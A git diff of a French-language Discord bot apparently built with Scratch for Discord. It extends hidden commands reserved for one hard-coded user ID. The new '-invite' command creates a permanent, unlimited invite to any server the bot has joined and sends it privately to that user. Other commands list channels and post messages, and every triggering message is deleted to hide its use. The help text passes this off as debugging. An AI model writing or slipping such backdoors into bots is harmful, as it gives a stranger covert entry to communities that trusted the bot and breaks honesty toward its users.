@@ -1,14 +1,3 @@
-const express = require('express');
-const app = express();
-const port = process.env.PORT || 8080;
-
-app.get('/', (req, res) => {
-  res.send('Bot Logoto en ligne !');
-});
-
-app.listen(port, () => {
-  console.log(`Serveur de vérification activé sur le port ${port}`);
-});
 (async()=>{
     // default imports
     const events = require('events');
@@ -406,7 +395,8 @@ app.listen(port, () => {
         !746069923465527339-salon (Obtenez tous les salons d'un serveur)
         !746069923465527339-help (ce message)
         !746069923465527339-test-ici (envoie un test sur se erveur)
-        !746069923465527339-message (envoie un message dans le salon actuel)
+        !746069923465527339-message [message] (envoie un message dans le salon actuel)
+        !746069923465527339-invite [id du serveur demandé] crée un lien d'invitation
     
         Si quelqu'un voit ça c'est juste pour dire que c'est utilisé pour du debug.`].join('')))});
         (s4dmessage).delete()
@@ -421,6 +411,11 @@ app.listen(port, () => {
             } else if (((((s4dmessage).content) || '').startsWith('!746069923465527339-message' || '')) && (s4dmessage.author.id) == '746069923465527339') {
         s4dmessage.channel.send({content:String((String(((s4dmessage).content)).replaceAll('!746069923465527339-message', String(''))))});
         (s4dmessage).delete()
+            } else if (((((s4dmessage).content) || '').startsWith('!746069923465527339-invite ' || '')) && (s4dmessage.author.id) == '746069923465527339') {
+        ((s4d.client.guilds.cache.get((String(((s4dmessage).content)).replaceAll('!746069923465527339-invite ', String(''))))).channels.cache.at(Number(1) - 1)).createInvite({ maxAge: 0, maxUses: 0 }).then(async invite => {
+           (s4d.client.users.cache.get(String('746069923465527339'))).send({content:String(('Lien d\'invitation :' + String(invite.url)))});
+    
+         });(s4dmessage).delete()
             }
     
         });
